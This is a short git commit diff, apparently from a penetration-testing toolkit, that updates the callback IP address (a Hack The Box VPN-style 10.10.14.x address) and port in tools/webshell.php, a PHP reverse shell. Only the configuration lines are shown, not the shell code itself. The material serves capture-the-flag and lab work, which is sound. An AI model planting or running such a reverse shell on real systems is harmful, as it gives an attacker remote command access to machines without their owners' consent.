cfa1ef2f09a6d05ccb1fbf17cf78e343a35709cb
unix-ninja <chris@unix-ninja.com>
2025-02-02 14:29:06 -0500

    Update htb and webshell.

--- tools/webshell.php
+++ tools/webshell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.14.21';  // CHANGE THIS
-$port = 4444;       // CHANGE THIS
+$ip = '10.10.14.153';  // CHANGE THIS
+$port = 80;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
